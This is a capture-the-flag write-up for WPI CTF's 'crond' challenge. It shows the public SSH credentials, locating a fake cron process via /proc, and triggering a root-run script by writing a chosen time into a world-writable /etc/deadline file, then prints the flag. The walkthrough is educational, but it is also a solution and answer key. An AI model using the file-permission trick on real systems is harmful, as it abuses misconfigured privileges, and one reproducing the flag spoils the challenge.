# crond writeup

So the challenge begins with the following information.

#### Why not roll your own version of cron?

- ```ssh ctf@crond.wpictf.xyz```
- pass: ```they will never guess it```
- Brought to you by acurless and SuckMore Software, a divison of WPI digital holdings Ltd.

Upon connecting to the server we are greeted by a shell and nothing else.
The first challenge is to find where their homebrew cron is and whether it is running.

```
sh-4.4$ ps
sh: ps: command not found
sh-4.4$ top
sh: top: command not found
sh-4.4$ htop
sh: htop: command not found
```

The ps, top and htop commands are all missing from this box so we will have to find it manually.
There are multiple ways of doing this, I chose to do into /bin and read through the files to check
for any matching cron/crond etc (the dumb way), and my friend looked in /proc for process infomation
(the smart way). I don't what command he ran exactly but ```grep -irn cron``` run from /proc printed
out this and some other junk when I ran it:
```
7/task/7/status:1:Name: fakecron
7/task/7/sched:1:fakecron (7, #threads: 1)
7/task/7/comm:1:fakecron
Binary file 7/task/7/cmdline matches
7/task/7/stat:1:7 (fakecron) S 1 1 1 34816 3241 4194624 70190 465171 0 0 12 56 257 55 20 0 1 0 24395018 7794688 479 18446744073709551615 1 1 0 0 0 0 65536 4 65538 0 0 0 17 0 0 0 0 0 0 0 0 0 0 0 0 0 0
7/status:1:Name:        fakecron
7/sched:1:fakecron (7, #threads: 1)
7/comm:1:fakecron
Binary file 7/cmdline matches
```
This shows that there is a process with the name fakecron.
Running ```whereis fakecron``` outputs ```fakecron: /usr/bin/fakecron```.
Now that we know where the file is we can go and inspect the file permissions.
```ls -l /usr/bin/fakecron``` returns ```-rwxr--r-- 1 root root 3095 Jan  1  2019 /usr/bin/fakecron```
We can see that it is world readable so lets read it!

At the top we can see a license notice for SuckMore Software then the code:

```bash
file="/etc/deadline"

cron() {
    second=0
    minute=0
    hour=0
    day=1;
    month=1;
    year=2019;

    while true; do
        sleep 1;
        target_second=`cut -d " " -f 6 $file`
        target_minute=`cut -d " " -f 5 $file`
        target_hour=`cut -d " " -f 4 $file`
        target_day=`cut -d " " -f 3 $file`
        target_month=`cut -d " " -f 2 $file`
        target_year=`cut -d " " -f 1 $file`

        if [[ "$second" -eq 59 ]]; then
            minute=$((minute+1));
            second=0;
        elif [[ "$minute" -eq 59 ]]; then
            hour=$((hour+1));
            second=0;
            minute=0;
        else
            second=$((second+1));
        fi

        if [[ "$year" -eq "$target_year" ]] \
            && [[ "$month" -eq "$target_month" ]] \
            && [[ "$day" -eq "$target_day" ]] \
            && [[ "$hour" -eq "$target_second" ]] \
            && [[ "$minute" -eq "$target_minute" ]] \
            && [[ "$second" -eq "$target_hour" ]]; then
            # echo "WPI{}" > /home/ctf/flag.txt
            exec_flag
        fi

        rm /etc/faketimerc
        echo "$year-$month-$day $hour:$minute:$second" > /etc/faketimerc
    done
}
```

We can see that is starts by defining file as ```/etc/deadline```
before initialising some counters to represent the date the first of january 2019.
it then starts a while true loop and every second it reads in the target_second/minute...
information from the deadline file, increments the current time and then compares the information
from the deadline file with the time represented by its counters, if they are equal the it will
print the flag to /home/ctf/flag.txt. Finally it writes the current time to /etc/faketimerc.
From there you can look at the file permissions as so:
```
sh-4.4$ ls -l /etc/deadline /etc/faketimerc
-rw-rw-rw- 1 root root 15 Jan  1  2019 /etc/deadline
-rw-r--r-- 1 root root 16 Jan  1  2019 /etc/faketimerc
```
Thus given that we can write to ```/etc/deadline``` and we can read from ```/etc/faketimerc```
we can get fakecron to print the flag by setting the time in ```/etc/deadline``` to a few seconds
ahead of ```/etc/faketimerc``` and then wait for the flag to appear in ```/home/ctf/flag.txt```.
```bash
sh-4.4$ cat /etc/deadline /etc/faketimerc
2020 1 1 0 1 0
2019-1-1 0:3:57
sh-4.4$ echo "2019 1 1 0 5 0" > /etc/deadline
sh-4.4$ cat /etc/deadline /etc/faketimerc
2019 1 1 0 5 0
2019-1-1 0:4:25
sh-4.4$ cat /etc/deadline /etc/faketimerc
2019 1 1 0 5 0
2019-1-1 0:5:0
sh-4.4$ ls
flag.txt
sh-4.4$ cat flag.txt
"WPI{L1nUxH@ck3r01a4}"
```
And there we have the flag.
